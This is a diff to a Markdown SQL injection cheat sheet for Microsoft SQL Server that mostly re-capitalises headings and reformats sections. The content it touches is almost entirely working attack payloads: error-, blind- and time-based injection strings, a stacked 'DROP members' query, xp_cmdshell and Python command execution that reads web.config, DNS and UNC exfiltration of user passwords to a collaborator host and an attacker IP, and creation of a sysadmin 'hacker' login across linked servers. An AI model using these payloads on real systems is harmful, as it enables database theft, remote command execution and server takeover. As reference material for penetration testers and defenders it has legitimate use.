@@ -12,22 +12,24 @@
 * [MSSQL Hostname](#mssql-hostname)
 * [MSSQL Database Name](#mssql-database-name)
 * [MSSQL Database Credentials](#mssql-database-credentials)
-* [MSSQL List databases](#mssql-list-databases)
-* [MSSQL List columns](#mssql-list-columns)
-* [MSSQL List tables](#mssql-list-tables)
+* [MSSQL List Databases](#mssql-list-databases)
+* [MSSQL List Columns](#mssql-list-columns)
+* [MSSQL List Tables](#mssql-list-tables)
 * [MSSQL Union Based](#mssql-union-based)
 * [MSSQL Error Based](#mssql-error-based)
 * [MSSQL Blind Based](#mssql-blind-based)
 * [MSSQL Time Based](#mssql-time-based)
-* [MSSQL Stacked query](#mssql-stacked-query)
-* [MSSQL Read file](#mssql-read-file)
-* [MSSQL Command execution](#mssql-command-execution)
-* [MSSQL Out of band](#mssql-out-of-band)
-    * [MSSQL DNS exfiltration](#mssql-dns-exfiltration)
-    * [MSSQL UNC path](#mssql-unc-path)
-* [MSSQL Make user DBA](#mssql-make-user-dba-db-admin)
+* [MSSQL Stacked Query](#mssql-stacked-query)
+* [MSSQL Read File](#mssql-read-file)
+* [MSSQL Command Execution](#mssql-command-execution)
+    * [XP_CMDSHELL](#xp_cmdshell)
+    * [Python Script](#python-script)
+* [MSSQL Out of Band](#mssql-out-of-band)
+    * [MSSQL DNS Exfiltration](#mssql-dns-exfiltration)
+    * [MSSQL UNC Path](#mssql-unc-path)
+* [MSSQL Make User DBA](#mssql-make-user-dba)
 * [MSSQL Trusted Links](#mssql-trusted-links)
-* [MSSQL List permissions](#mssql-list-permissions)
+* [MSSQL List Permissions](#mssql-list-permissions)
 * [References](#references)
 
 
@@ -78,7 +80,7 @@ SELECT SERVERPROPERTY('productlevel')
 SELECT SERVERPROPERTY('edition');
 ```
 
-## MSSQL Database name
+## MSSQL Database Name
 
 ```sql
 SELECT DB_NAME()
@@ -100,7 +102,7 @@ SELECT DB_NAME()
     ```
 
 
-## MSSQL List databases
+## MSSQL List Databases
 
 ```sql
 SELECT name FROM master..sysdatabases;
@@ -108,7 +110,7 @@ SELECT DB_NAME(N); — for N = 0, 1, 2, …
 SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)
 ```
 
-## MSSQL List columns
+## MSSQL List Columns
 
 ```sql
 SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable'); -- for the current DB only
@@ -117,7 +119,7 @@ SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master.
 SELECT table_catalog, column_name FROM information_schema.columns
 ```
 
-## MSSQL List tables
+## MSSQL List Tables
 
 ```sql
 SELECT name FROM master..sysobjects WHERE xtype = 'U'; -- use xtype = 'V' for views
@@ -154,36 +156,43 @@ $ SELECT  UserId, UserName from Users
 ```
 
 
-## MSSQL Error based
+## MSSQL Error Based
 
-```sql
-For integer inputs : convert(int,@@version)
-For integer inputs : cast((SELECT @@version) as int)
+* For integer inputs
 
-For string inputs   : ' + convert(int,@@version) + '
-For string inputs   : ' + cast((SELECT @@version) as int) + '
-```
+    ```sql
+    convert(int,@@version)
+    cast((SELECT @@version) as int)
+    ```
+
+* For string inputs
+
+    ```sql
+    ' + convert(int,@@version) + '
+    ' + cast((SELECT @@version) as int) + '
+    ```
 
 
-## MSSQL Blind based
+## MSSQL Blind Based
 
 ```sql
 AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
+```
 
+```sql
 AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
 AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
 AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
-
 AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
-
 SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
-
 WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
 SELECT message FROM data WHERE row = 1 and message like 't%'
 ```
 
 
-## MSSQL Time based
+## MSSQL Time Based
+
+In a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the database pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed successfully or not.
 
 ```sql
 ProductID=1;waitfor delay '0:0:10'--
@@ -191,7 +200,9 @@ ProductID=1);waitfor delay '0:0:10'--
 ProductID=1';waitfor delay '0:0:10'--
 ProductID=1');waitfor delay '0:0:10'--
 ProductID=1));waitfor delay '0:0:10'--
+```
 
+```sql
 IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
 IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
 ```
@@ -199,7 +210,7 @@ IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
 
 ## MSSQL Stacked Query
 
-* Without any statement terminator
+* Stacked query without any statement terminator
     ```sql
     -- multiple SELECT statements
     SELECT 'A'SELECT 'B'SELECT 'C'
@@ -212,13 +223,13 @@ IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
     SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
     ```
 
-* Use a semi-colon ";" to add another query
+* Use a semi-colon "`;`" to add another query
     ```sql
     ProductID=1; DROP members--
     ```
 
 
-## MSSQL Read file
+## MSSQL Read File
 
 **Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.
 
@@ -227,7 +238,9 @@ IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
 ```
 
 
-## MSSQL Command execution
+## MSSQL Command Execution
+
+### XP_CMDSHELL
 
 ```sql
 EXEC xp_cmdshell "net user";
@@ -244,45 +257,36 @@ EXEC sp_configure 'xp_cmdshell',1;
 RECONFIGURE;
 ```
 
-To interact with the MSSQL instance.
+### Python Script 
+
+> Executed by a different user than the one using `xp_cmdshell` to execute commands
 
 ```powershell
-sqsh -S 192.168.1.X -U sa -P superPassword
-python mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758
-```
-
-Execute Python script 
-
-> Executed by a different user than the one using xp_cmdshell to execute commands
-
-```powershell
-#Print the user being used (and execute commands)
+# Print the user being used (and execute commands)
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
-#Open and read a file
 EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
-#Multiline
-EXECUTE sp_execute_external_script @language = N'Python', @script = N'
-import sys
-print(sys.version)
-'
-GO
 ```
 
-## MSSQL Out of band
+
+## MSSQL Out of Band
 
 ### MSSQL DNS exfiltration
 
 Technique from https://twitter.com/ptswarm/status/1313476695295512578/photo/1
 
-```powershell
-# Permissions: Requires VIEW SERVER STATE permission on the server.
-1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
+* **Permission**: Requires VIEW SERVER STATE permission on the server.
 
-# Permissions: Requires the CONTROL SERVER permission.
-1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
-1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
-```
+    ```powershell
+    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
+    ```
+
+* **Permission**: Requires the CONTROL SERVER permission.
+
+    ```powershell
+    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
+    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
+    ```
 
 
 ### MSSQL UNC Path
@@ -308,7 +312,7 @@ RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
 ```
 
 
-## MSSQL Make user DBA (DB admin)
+## MSSQL Make User DBA
 
 ```sql
 EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
@@ -345,7 +349,7 @@ EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') 
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
 
-## List permissions
+## List Permissions
 
 Listing effective permissions of current user on the server.
 
